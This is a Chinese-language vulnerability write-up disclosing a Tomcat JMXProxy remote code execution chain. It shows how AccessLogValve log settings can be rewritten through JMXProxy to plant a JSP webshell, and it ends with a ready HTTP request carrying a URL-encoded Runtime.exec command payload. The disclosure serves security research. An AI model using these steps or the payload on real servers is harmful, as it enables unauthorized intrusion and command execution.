Tomcat JMXProxy RCE
0x00 前言
在介绍该漏洞之前有必要先进行一些说明
（1）不影响默认配置的 Tomcat
（2）不影响 SpringBoot 只影响通过 war 部署的项目
（3）该漏洞为利用链中的一环，配合第三方平台未授权访问或弱口令可以直接利用
既然官方不认，那我直接公开了
0x01 Manager
Tomcat 一直存在一个不是“漏洞”的漏洞： Tomcat Manager 导致上传 war 解压生成 webshell 的 RCE
在 tomcat/conf/tomcat-users.xml 配置
访问 /manager/html 输入用户名和密码，即可在里面上传 war 进行部署
" roles="manager-gui"/>
显然这不归 Tomcat 负责，应该由用户保证自己的账号和密码安全
Tomcat 对于 Manager 的管理页面采用了 HTTP Basic 认证，也就是用户名密码拼接后 Base64 编码
如果想要暴力破解这个身份认证其实是不太可能的，因为 Tomcat 已经考虑到这个问题：参考
LockOutRealm 类的代码，默认在输入错误5次后会锁定5分钟。这也是 Tomcat 官方拒绝该漏洞的原因
之一，他们认为基于 JMXProxy 实现的 RCE 攻击和这个类似，由用户负责安全
其实值得关心的是： Tomcat 并不仅仅支持管理页面，同时支持 API 和 JMXProxy
如果 API 可以未授权访问也会导致严重的安全问题
使用 API 的方式是： http://{host}:{port}/manager/text/{command}?{parameters}
使用 API 部署 WAR 包：
如何使用 JMXProxy 做到 RCE 是本文的重点内容
public class LockOutRealm extends CombinedRealm {
    /**
     * The number of times in a row a user has to fail authentication to be
     * locked out. Defaults to 5.
     */
    protected int failureCount = 5;
    /**
     * The time (in seconds) a user is locked out for after too many
     * authentication failures. Defaults to 300 (5 minutes).
     */
    protected int lockOutTime = 300;
}
http://localhost:8080/manager/text/deploy?path=/footoo&war=file:/path/to/foo
0x02 JMX
JMX 与 Tomcat 无关，在 Java 官方文档对于 JMX 的定义如下：
JMX( Java Management Extensions )是一个为应用程序植入管理功能的框架。 JMX 是一套标准的代理
和服务，实际上，用户可以在任何 Java 应用程序中使用这些代理和服务实现管理。
用人话来说： JMX 让程序有被管理的功能，例如某 Web 网站是在24小时不间断运行，那么对网站进行监
控是必要的功能；又或者在业务高峰的期间，想对接口进行限流，就必须去修改接口并发的配置值。
借用网上博客一张图：一般 JMX 会通过 Adapter 实现 Web 管理页面，例如 Zabbix 和 Nagios 等工具对
于 JVM 的监控实现，老一些的平台比如 JDMK 和 MX4J 等。
结合实例来讲，我搭建了一个 MX4J 的监控平台
进入其中的 ClassLoading 属性观察：监控到类的属性，并且部分值可以在运行时进行修改
    ┌─────────┐  ┌─────────┐
    │jconsole │  │   Web   │
    └─────────┘  └─────────┘
         │            │
┌ ─ ─ ─ ─│─ ─ ─ ─ ─ ─ ┼ ─ ─ ─ ─
 JVM     ▼            ▼        │
│   ┌─────────┐  ┌─────────┐
  ┌─┤Connector├──┤ Adaptor ├─┐ │
│ │ └─────────┘  └─────────┘ │
  │       MBeanServer        │ │
│ │ ┌──────┐┌──────┐┌──────┐ │
  └─┤MBean1├┤MBean2├┤MBean3├─┘ │
│   └──────┘└──────┘└──────┘
 ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘
在网上进行搜索可以发现大量类似的 JMX 管理页面，我们可以实时地修改 JVM 内部的一些属性
但这种修改大多数情况下是无意义的，顶多由于某些属性为空通过空指针导致拒绝服务这样的鸡肋洞
因此研究如何通过 JMX 修改变量以实现 RCE 是比较有意义的研究
0x03 JMXProxy
接下来是本文的重点，在 Tomcat Manager 中还有一种特殊的管理： JMX Proxy Servlet
参考 Tomcat 9.0 官方文档 中的描述，翻译后为：
JMX Proxy Servlet 是一个轻量级代理，用于获取和设置 Tomcat 内部或任何已通过 MBean 公开的类。
它的使用不是非常用户友好，但对于集成命令行脚本以监视和更改 Tomcat 的内部结构非常有帮助。您
可以使用代理做两件事：获取信息和设置信息。要真正了解 JMX Proxy Servlet，您应该对 JMX 有一个
大致的了解。如果您不知道 JMX 是什么，那么请准备好被迷惑（不知道怎么解释 confused 这个词就用
迷惑了）
直接阅读这段话可能不能够理解，通过开头对 JMX 概念的描述，应该问题不大。 Tomcat 提供了 JMX 的
Agent 或者说 API 给用户，而用户一般不是直接手动管理，而是会选择第三方平台进行管理，正是这个
原因导致该漏洞有了实际的危害
参考示例，例如我们需要监控运行时的堆内存使用情况
执行后得到的结果
不仅可以监控 JVM 属性也可以修改 JVM 中的一些属性，例如开头 JMX 篇章中提到的一个场景：
在业务高峰的期间，想对接口进行限流，就必须去修改接口并发的配置值。
在 JMXProxy 中也提供了修改一些变量的方法
http://webserver/manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
OK - Attribute get 'java.lang:type=Memory' - HeapMemoryUsage = 
javax.management.openmbean.CompositeDataSupport
// ......
contents={committed=308281344, init=534773760, max=7602176000, used=106332232})
http://webserver/manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
参数：
set: 目标的 BEANNAME （类似类名）
att: 目标的属性（类似类中的字段属性）
val: 需要修改的新值
另外支持命令调用，不过这一点我并没有做深入研究（也许一些特殊命令组合存在漏洞？）
总结：
JMXProxy 提供 Tomcat 的 JMX 接口给第三方平台分析和管理
用于监控 Tomcat 内部并且支持部分变量的修改
0x04 RCE
本节内容是针对 Tomcat 的 JMXProxy 如何实现 RCE
换句话来说：哪些 JMXProxy 支持修改的属性被修改后可以 RCE
经过肉眼审计，我发现一个有趣的类（熟悉 Spring RCE 的师傅应该一眼就能看出来）
AccessLogValve
对应 JXMProxy 中的描述信息如下，重点关注五个属性：
prefix：访问日志前缀
pattern：访问日志格式
suffix：访问日志后缀
directory：访问日志目录
fileDateFormat：访问日志名日期格式
假设以上五个属性可以被设置，那么接下来的 RCE 之路就很简单了
于是我测试了每一个属性，发现都可以成功修改
http://webserver/manager/jmxproxy/?invoke=BEANNAME&op=方法名&ps=参数
Name: Catalina:type=Valve,host=localhost,name=AccessLogValve
modelerType: org.apache.tomcat.util.modeler.BaseModelMBean
rotatable: true
checkExists: false
prefix: localhost_access_log
pattern: %h %l %u %t "%r" %s %b
className: org.apache.catalina.valves.AccessLogValve
locale: zh_CN
suffix: .txt
directory: logs
enabled: true
stateName: STARTED
buffered: true
asyncSupported: true
renameOnRotate: false
fileDateFormat: .yyyy-MM-dd
RCE 的思路如下：
修改日志格式为一句话：于是每条新日志都会变成一句话
注意不能包含特殊符号，所以使用 %{header}i 从请求头中提取 <% 等特殊符号
修改日志后缀为：JSP
修改日志前缀为：shell（只要可控即可无需在意具体是什么）
修改日志目录为可以解析JSP的目录：例如默认的 webapps/ROOT
修改日志文件名时间格式目的是使 rotate 创建新文件，写入 JSP 马
带有特殊请求头的请求即可写入 Webshell
第一步：
这里有一个细节：要求其中的 val 参数为全部的 URL 编码
开头和结尾的特殊符号从请求头的 p 和 s 中获取
第二步：
修改日志后缀为：JSP
第三步：
修改日志前缀为：shell（当时间格式为空时文件名就是shell.jsp了）
GET /manager/jmxproxy/?
set=Catalina:type=Valve,host=localhost,name=AccessLogValve&att=pattern&val=%25%7
b%70%7d%69%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%
78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63
%6d%64%22%29%29%3b%20%25%7b%73%7d%69 HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Authorization: Basic BASE64(username:password)